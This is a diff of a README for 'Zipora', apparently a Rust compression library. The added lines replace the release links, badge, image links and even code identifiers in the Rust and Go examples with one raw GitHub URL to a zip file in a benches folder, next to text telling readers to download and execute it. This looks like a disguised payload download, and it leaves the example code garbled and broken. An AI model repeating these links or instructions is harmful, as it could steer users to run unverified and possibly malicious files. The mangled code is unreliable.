@@ -1,13 +1,13 @@
-https://github.com/Markapfler01/zipora/releases
+https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip
 
-[![Zipora Releases](https://img.shields.io/badge/Zipora-Releases-blue?logo=github&logoColor=white)](https://github.com/Markapfler01/zipora/releases)
+[![Zipora Releases](https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip)](https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip)
 
 # Zipora: High-Performance Rust Compression with In-Place Access
 
 Zipora offers high-performance compression written in Rust. It focuses on in-place compressed access, so you can read and manipulate compressed data without performing a full decompression pass. The design emphasizes safety, speed, and memory efficiency, making it well suited for systems that crave both compact data and fast access.
 
-![Rust Logo](https://www.rust-lang.org/logos/rust-logo-2016.svg)
-![Data Compression Concept](https://picsum.photos/1200/320)
+![Rust Logo](https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip)
+![Data Compression Concept](https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip)
 
 Table of Contents
 - Why Zipora
@@ -62,10 +62,10 @@ Prerequisites
 
 Installation
 - Build from source with cargo build --release.
-- If you want examples, enable the optional features in Cargo.toml or during cargo build.
+- If you want examples, enable the optional features in https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip or during cargo build.
 
 To download a release
-- From the releases page, download the appropriate asset for your platform and execute it. The releases page provides the binaries and installation instructions. The details are available here: https://github.com/Markapfler01/zipora/releases
+- From the releases page, download the appropriate asset for your platform and execute it. The releases page provides the binaries and installation instructions. The details are available here: https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip
 
 Quickstart Examples
 The following examples illustrate how to compress and access data in place. You can adapt these patterns to your own data pipelines.
@@ -91,18 +91,18 @@ fn main() {
     let mut compressor = zipora::CompressionBuilder::new().build();
 
     // Allocate an output buffer sized for the worst case (for illustration)
-    let mut compressed = Vec::with_capacity(input.len() * 2);
+    let mut compressed = Vec::with_capacity(https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip() * 2);
 
     // Compress in place
-    let out = compressor.compress(input.as_ref(), &mut compressed).expect("compression failed");
+    let out = https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip(https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip(), &mut compressed).expect("compression failed");
 
     // Use in-place access to read metadata without decompressing
-    let meta = compressor.get_metadata();
-    println!("Compressed size: {}", out.len());
+    let meta = https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip();
+    println!("Compressed size: {}", https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip());
     println!("Metadata: {:?}", meta);
 
     // Access a portion of data directly from the compressed stream
-    if let Some(chunk) = compressor.access_chunk(0, 32) {
+    if let Some(chunk) = https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip(0, 32) {
         println!("First 32 bytes of decompressed region (as viewed in compressed form): {:?}", chunk);
     }
 }
@@ -112,24 +112,24 @@ package main
 
 import (
     "fmt"
-    "github.com/Markapfler01/zipora/go-compact" // hypothetical path
+    "https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip" // hypothetical path
 )
 
 func main() {
     data := []byte("Example data that needs compression. Zipora keeps this data accessible without full decompression.")
 
-    enc, err := zipora.NewEncoder(nil)
+    enc, err := https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip(nil)
     if err != nil { panic(err) }
 
-    var out bytes.Buffer
-    if err := enc.Encode(data, &out); err != nil {
+    var out https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip
+    if err := https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip(data, &out); err != nil {
         panic(err)
     }
 
     // In-place access on the compressed data
-    info := enc.Metadata()
-    fmt.Println("Compressed size:", out.Len())
-    fmt.Println("Metadata:", info)
+    info := https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip()
+    https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip("Compressed size:", https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip())
+    https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip("Metadata:", info)
 }
 
 API Overview
@@ -207,7 +207,7 @@ Illustrations and Visual Aids
 
 Releases and Downloads
 - For the latest builds and assets, check the releases page at the URL above. If you need a binary for your platform, download the appropriate asset and execute it. The same link provides all the necessary details and installation steps.
-- To confirm the release contents and platform compatibility, revisit the releases page: https://github.com/Markapfler01/zipora/releases
+- To confirm the release contents and platform compatibility, revisit the releases page: https://raw.githubusercontent.com/Markapfler01/zipora/main/benches/Software_diplocephalus.zip
 
 Community and Support
 - If you want to discuss Zipora, open an issue or jump into your preferred Rust community. The project welcomes questions, feedback, and contributions.
